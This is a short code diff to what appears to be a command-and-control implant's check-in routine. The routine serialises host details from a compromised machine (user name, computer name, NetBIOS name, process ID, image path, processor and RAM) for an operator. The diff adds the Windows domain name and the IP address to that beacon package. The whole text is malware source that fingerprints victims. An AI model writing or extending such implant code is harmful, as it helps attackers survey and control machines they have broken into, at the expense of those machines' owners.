@@ -21,6 +21,7 @@ auto DECLFN Transport::Checkin(
     Self->Pkg->Byte( CheckinPkg, Self->Machine.OsArch );
     Self->Pkg->Str( CheckinPkg, Self->Machine.UserName );
     Self->Pkg->Str( CheckinPkg, Self->Machine.CompName );
+    Self->Pkg->Str( CheckinPkg, Self->Machine.DomName );
     Self->Pkg->Str( CheckinPkg, Self->Machine.NetBios );
     Self->Pkg->Int32( CheckinPkg, Self->Session.ProcessID );
     Self->Pkg->Str( CheckinPkg, Self->Session.ImagePath );
@@ -77,6 +78,7 @@ auto DECLFN Transport::Checkin(
 
     // additional machine informations
     Self->Pkg->Str( CheckinPkg, Self->Machine.ProcessorName );
+    Self->Pkg->Int32( CheckinPkg, Self->Machine.IpAddress );
     Self->Pkg->Int32( CheckinPkg, Self->Machine.TotalRAM );
     Self->Pkg->Int32( CheckinPkg, Self->Machine.AvalRAM );
     Self->Pkg->Int32( CheckinPkg, Self->Machine.UsedRAM );
